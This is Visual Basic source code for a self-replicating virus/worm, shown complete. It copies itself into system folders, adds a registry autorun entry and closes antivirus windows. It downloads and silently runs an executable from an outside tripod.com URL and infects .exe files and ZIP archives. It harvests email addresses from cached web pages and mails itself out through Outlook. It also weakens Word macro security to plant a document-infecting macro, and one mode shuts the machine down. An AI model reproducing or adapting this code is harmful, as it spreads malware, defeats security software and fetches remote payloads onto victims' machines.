Attribute VB_Name = "Module1"
Option Explicit
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)
Private Declare Function GetCommandLine Lib "kernel32" Alias "GetCommandLineA" () As Long
Private Declare Function lstrlen Lib "kernel32" Alias "lstrlenA" (ByVal lpString As Long) As Long
Private Declare Function SHGetPathFromIDList Lib "shell32.dll" Alias "SHGetPathFromIDListA" (ByVal pidl As Long, ByVal pszPath As String) As Long
Private Declare Function SHGetSpecialFolderLocation Lib "shell32.dll" (ByVal hwndOwner As Long, ByVal nFolder As Long, pidl As ITEMIDLIST) As Long
Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Private Declare Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As Long, lpExitCode As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Function InternetGetConnectedState Lib "wininet.dll" (ByRef lpdwFlags As Long, ByVal dwReserved As Long) As Long
Private iResult As Long
Private hProg As Long
Private idProg As Long
Private iExit As Long
Const WM_CLOSE = &H10
Const STILL_ACTIVE As Long = &H103
Const PROCESS_ALL_ACCESS As Long = &H1F0FFF
Const EWX_SHUTDOWN = 1
Const CSIDL_PERSONAL = &H5
Const CSIDL_STARTUP = &H7
Const CSIDL_TIF = &H20
Const CSIDL_WIN = &H24
Const CSIDL_WINSYS = &H25
Const MAX_PATH = 260
Private Type SHITEMID
    cb As Long
    abID As Byte
End Type
Private Type ITEMIDLIST
    mkid As SHITEMID
End Type
Sub Main()
On Error Resume Next
Dim vdir As String
Dim lenhost As String
Dim vc As String
Dim mark As String
Dim hostlen As String
Dim virlen As String
Dim buffhostlen As String
Dim buffvirlen As String
Call regcall
Call killav
vdir = App.path
If Right(vdir, 1) <> "\" Then vdir = vdir & "\"
FileCopy vdir & App.EXEName & ".exe", GetSpecialfolder(CSIDL_WIN) & "\Ms0701i32.exe"
FileCopy vdir & App.EXEName & ".exe", GetSpecialfolder(CSIDL_WINSYS) & "\lolita.exe"
'--------------- check if virus or worm ------------------------
Open vdir & App.EXEName & ".exe" For Binary Access Read As #1
lenhost = (LOF(1))
vc = Space(lenhost)
Get #1, , vc
Close #1
mark = Right(vc, 2)
If mark <> "b8" Then
'worm
Call extrkzip
If InStr(1, GetCommLine, "-petikb8") = 0 Then
Else
Call wording
Call zipinfect
End If
If InStr(1, GetCommLine, "-alcopaulb8") = 0 Then
Else
Call virustime
End If
If InStr(1, GetCommLine, "-trojanmode") = 0 Then
Else
ShutdownWindows EWX_SHUTDOWN
End If
listht GetSpecialfolder(CSIDL_TIF)
Else
'virus : execute the host
Open vdir & App.EXEName & ".exe" For Binary Access Read As #4
hostlen = (LOF(4) - 75264)
virlen = (75264) 'worm/virus + zip component
buffhostlen = Space(hostlen)
buffvirlen = Space(virlen)
Get #4, , buffvirlen
Get #4, , buffhostlen
Close #4
Open vdir & "XxX.exe" For Binary Access Write As #3
Put #3, , buffhostlen
Close #3
'borrowed from murkry's vb5 virus
idProg = Shell(vdir & "XxX.exe", vbNormalFocus)
hProg = OpenProcess(PROCESS_ALL_ACCESS, False, idProg)
GetExitCodeProcess hProg, iExit
Do While iExit = STILL_ACTIVE
DoEvents
GetExitCodeProcess hProg, iExit
Loop
Kill vdir & "XxX.exe"
End If
'-------------------------------------------------------------------
Call downloader
End Sub
'---------------------- kill avs --------------------------------------
Sub killav()
On Error Resume Next
Dim avn, avn1, avn2, avn3, avn4, avn5, avn6, avn7, avn8, avn9, avn10, avn11, avn12
Dim aWindow As Long
Dim angReturnValue As Long
Dim num3, arrr3, av
avn = "Pop3trap"
avn1 = "JavaScan"
avn2 = "Modem Booster"
avn3 = "vettray"
avn4 = "Timer"
avn5 = "CD-Rom Monitor"
avn6 = "F-STOPW Version 5.06c"
avn7 = "PC-cillin 2000 : Virus Alert"
avn8 = "DAPDownloadManager"
avn9 = "Real-time Scan"
avn10 = "IOMON98"
avn11 = "AVP Monitor"
avn12 = "NAI_VS_STAT"
For num3 = 0 To 12
arrr3 = Array(avn, avn1, avn2, avn3, avn4, avn5, avn6, avn7, avn8, avn9, avn10, avn11, avn12)
av = arrr3(num3)
aWindow = FindWindow(vbNullString, av)
angReturnValue = PostMessage(aWindow, WM_CLOSE, vbNull, vbNull)
Next num3
End Sub
'-------------------------- download update and run it ----------------------
Sub downloader()
On Error Resume Next
Dim databyte() As Byte
If InternetGetConnectedState(0&, 0&) = 0 Then GoTo xIt
Form1.Inet1.RequestTimeout = 40
databyte() = Form1.Inet1.OpenURL("http://p0th0le.tripod.com/a.exe", icByteArray)
Open "c:\update.exe" For Binary Access Write As #2
Put #2, , databyte()
Close #2
Shell "c:\update.exe", vbHide
xIt:
End Sub
'----------------------c:\WINDOWS file infection----------------
Sub virustime()
On Error Resume Next
Dim vdir As String
Dim sfile As String
Dim a As String
Dim arr1
Dim lenhost As String
Dim vc As String
Dim mark As String
Dim host
vdir = App.path
If Right(vdir, 1) <> "\" Then vdir = vdir & "\"
sfile = dir$(GetSpecialfolder(CSIDL_WIN) & "\*.exe")
While sfile <> ""
a = a & sfile & "/"
sfile = dir$
Wend
arr1 = Split(a, "/")
For Each host In arr1
Open GetSpecialfolder(CSIDL_WIN) & "\" & host For Binary Access Read As #1
lenhost = (LOF(1))
vc = Space(lenhost)
Get #1, , vc
Close #1
mark = Right(vc, 2)
If mark <> "b8" Then
GoTo notinfected
Else
GoTo gggoop
End If
notinfected:
infect (GetSpecialfolder(CSIDL_WIN) & "\" & host)
Exit For
gggoop:
Next host
End Sub
Function infect(hostpath As String)
On Error Resume Next
Dim ffile
Dim hostcode As String
Dim vir As String
Dim vircode As String
Dim header As String
Dim f As String
vir = App.path
If Right(vir, 1) <> "\" Then vir = vir & "\"
Open hostpath For Binary Access Read As #1
hostcode = Space(LOF(1))
Get #1, , hostcode
Close #1
Open vir & App.EXEName & ".exe" For Binary Access Read As #2
header = Space(LOF(2))
Get #2, , header
Close #2
f = "b8"
Open hostpath For Binary Access Write As #3
Put #3, , header
Put #3, , hostcode
Put #3, , f
Close #3
End Function
'--------------------zip infection-----------------------------
Sub zipinfect()
On Error Resume Next
list ("c:\")
End Sub

Sub list(dir)
On Error Resume Next
Dim fso, ssf, fil
Set fso = CreateObject("Scripting.FileSystemObject")
Set ssf = fso.GetFolder(dir).SubFolders
For Each fil In ssf
infection (fil.path)
list (fil.path)
Next
End Sub

Sub infection(dir)
Dim fso, cf, fil, ext
Set fso = CreateObject("Scripting.FileSystemObject")
Set cf = fso.GetFolder(dir).Files
For Each fil In cf
ext = fso.GetExtensionName(fil.path)
ext = LCase(ext)
If (ext = "zip") Then
Shell "c:\piss.exe " & fil.path & " " & GetSpecialfolder(CSIDL_WINSYS) & "\lolita.exe", vbHide
End If
Next
End Sub
'--------------------trojan mode payload-----------------------------
Sub ShutdownWindows(ByVal intParamater As Integer)
Dim blnReturn As Boolean
blnReturn = ExitWindowsEx(intParamater, 0)
End Sub
'--------------------variable commandline-----------------------------
Sub regcall()
On Error Resume Next
Dim b As String, c As String, d As String, ws As Object
Dim regcol, final
Set ws = CreateObject("WScript.Shell")
b = "-alcopaulb8"
c = "-petikb8"
d = "-trojanmode"
regcol = Array(b, c, d)
Randomize
final = regcol(Int(Rnd * 3))
ws.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices\b8", GetSpecialfolder(CSIDL_WINSYS) & "\Ms0701i32.exe " & final
If dir("c:\regedit.exe") <> "regedit.exe" Then
FileCopy GetSpecialfolder(CSIDL_WIN) & "\regedit.exe", "c:\regedit.exe"
End If
End Sub
'--------------------extract zip software-----------------------------
Sub extrkzip()
On Error Resume Next
Dim vdir As String
Dim wormlen As String
Dim rarlen As String
Dim buffwormlen As String
Dim buffrarlen As String
vdir = App.path
If Right(vdir, 1) <> "\" Then vdir = vdir & "\"
Open vdir & App.EXEName & ".exe" For Binary Access Read As #1
wormlen = (LOF(1) - 63488)
rarlen = (63488)
buffwormlen = Space(wormlen)
buffrarlen = Space(rarlen)
Get #1, , buffwormlen
Get #1, , buffrarlen
Close #1
Open "c:\piss.exe" For Binary Access Write As #2
Put #2, , buffrarlen
Close #2
Shell "c:\piss.exe c:\brigada8.zip " & vdir & App.EXEName & ".exe", vbHide
End Sub
'--------------------e-mail collect and e-mailing-----------------------------
Sub listht(dir)
On Error Resume Next
Dim fso, ssfh, filh
Set fso = CreateObject("Scripting.FileSystemObject")
Set ssfh = fso.GetFolder(dir).SubFolders
For Each filh In ssfh
infht (filh.path)
listht (filh.path)
Next
End Sub

Sub infht(dir)
Dim mlto As String
Dim fso, cfh, filh, ext, textline, q
Dim j As Long, cnt As Long
Set fso = CreateObject("Scripting.FileSystemObject")
Set cfh = fso.GetFolder(dir).Files
For Each filh In cfh
ext = fso.GetExtensionName(filh.path)
ext = LCase(ext)
If (ext = "htm") Or (ext = "html") Then
Open filh.path For Input As #1
Do While Not EOF(1)
Line Input #1, textline
q = q & textline
Loop
Close #1
For j = 1 To Len(q)
If Mid(q, j, 7) = "mailto:" Then
mlto = ""
cnt = 0
Do While Mid(q, j + 7 + cnt, 1) <> """"
mlto = mlto + Mid(q, j + 7 + cnt, 1)
cnt = cnt + 1
Loop
Call Worming(mlto)
End If
Next
End If
Next
End Sub
Function Worming(mail As String)
On Error Resume Next
Dim a, b, c
Set a = CreateObject("Outlook.Application")
Set b = a.GetNameSpace("MAPI")
If a = "Outlook" Then
b.Logon "profile", "password"
Set c = a.CreateItem(0)
c.Recipients.Add mail
c.Subject = "check us out"
c.Body = "we exist to give everyone a smiley face... :)"
c.Attachments.Add "c:\brigada8.zip"
c.Send
c.DeleteAfterSubmit = True
b.Logoff
End If
End Function
'--------------------commandline parser-----------------------------
Private Function GetCommLine() As String
    Dim RetStr As Long, SLen As Long
    Dim Buffer As String
    RetStr = GetCommandLine
    SLen = lstrlen(RetStr)
    If SLen > 0 Then
        GetCommLine = Space$(SLen)
        CopyMemory ByVal GetCommLine, ByVal RetStr, SLen
    End If
End Function
'--------------------get special folder-----------------------------
Private Function GetSpecialfolder(CSIDL As Long) As String
    Dim r As Long
    Dim IDL As ITEMIDLIST
    Dim path As String
    r = SHGetSpecialFolderLocation(100, CSIDL, IDL)
    If r = 0 Then
        path$ = Space$(512)
        r = SHGetPathFromIDList(ByVal IDL.mkid.cb, ByVal path$)
        GetSpecialfolder = Left$(path, InStr(path, Chr$(0)) - 1)
        Exit Function
    End If
    GetSpecialfolder = ""
End Function
'------------------ document infection ---------------------------
Sub wording()
On Error Resume Next
Dim vdir As String
vdir = App.path
If Right(vdir, 1) <> "\" Then vdir = vdir & "\"
FileCopy vdir & App.EXEName & ".exe", "c:\XXXview.exe"
Open "c:\v.r" For Output As #2
Print #2, "REGEDIT4"
Print #2, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
Print #2, """Level""=dword:00000001"
Print #2, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]"
Print #2, """Level""=dword:00000001"
Print #2, """AccessVBOM""=dword:00000001"
Close #2
Shell "c:\regedit.exe /s c:\v.r", vbHide
Kill "c:\v.r"
Open "c:\nl.tmp" For Output As #9
Print #9, "Sub document_close()"
Print #9, "On Error Resume Next"
Print #9, "Open ""c:\xp.exp"" For Output As 2"
Print #9, "Print #2, ""sub document_open()"""
Print #9, "Print #2, ""On Error Resume Next"""
Print #9, "Print #2, ""jbo = ActiveDocument.Shapes(1).OLEFormat.ClassType"""
Print #9, "Print #2, ""With ActiveDocument.Shapes(1).OLEFormat"""
Print #9, "Print #2, ""    .ActivateAs ClassType:=jbo"""
Print #9, "Print #2, ""    .Activate"""
Print #9, "Print #2, ""End With"""
Print #9, "Print #2, ""end sub"""
Print #9, "Close 2"
Print #9, "Set fso = CreateObject(""Scripting.FileSystemObject"")"
Print #9, "Set nt = ActiveDocument.VBProject.vbcomponents(1).codemodule"
Print #9, "Set iw = fso.OpenTextFile(""c:\xp.exp"", 1, True)"
Print #9, "nt.DeleteLines 1, nt.CountOfLines"
Print #9, "i = 1"
Print #9, "Do While iw.atendofstream <> True"
Print #9, "b = iw.readline"
Print #9, "nt.InsertLines i, b"
Print #9, "i = i + 1"
Print #9, "Loop"
Print #9, "ActiveDocument.Shapes.AddOLEObject _"
Print #9, "FileName:=""c:\XXXview.exe"", _"
Print #9, "LinkToFile:=False"
Print #9, "ActiveDocument.Save"
Print #9, "Open ""c:\b8.r"" For Output As #3"
Print #9, "Print #3, ""REGEDIT4"""
Print #9, "Print #3, ""[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"""
Print #9, "Print #3, """"""Level""""=dword:00000001"""
Print #9, "Print #3, ""[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]"""
Print #9, "Print #3, """"""Level""""=dword:00000001"""
Print #9, "Print #3, """"""AccessVBOM""""=dword:00000001"""
Print #9, "Close #3"
Print #9, "Shell ""c:\regedit.exe /s c:\b8.r"", vbHide"
Print #9, "Kill ""c:\b8.r"""
Print #9, "End Sub"
Close #9
Open GetSpecialfolder(CSIDL_STARTUP) & "\startup.vbs" For Output As #6
Print #6, "On Error Resume Next"
Print #6, "Set fso = CreateObject(""Scripting.FileSystemObject"")"
Print #6, "Set oword = CreateObject(""Word.Application"")"
Print #6, "oword.Visible = False"
Print #6, "Set nt = oword.NormalTemplate.vbproject.vbcomponents(1).codemodule"
Print #6, "Set iw = fso.OpenTextFile(""c:\nl.tmp"", 1, True)"
Print #6, "nt.DeleteLines 1, nt.CountOfLines"
Print #6, "i = 1"
Print #6, "Do While iw.atendofstream <> True"
Print #6, "b = iw.readline"
Print #6, "nt.InsertLines i, b"
Print #6, "i = i + 1"
Print #6, "Loop"
Print #6, "oword.NormalTemplate.Save"
Print #6, "oword.NormalTemplate.Close"
Print #6, "oword.quit"
Close #6
End Sub
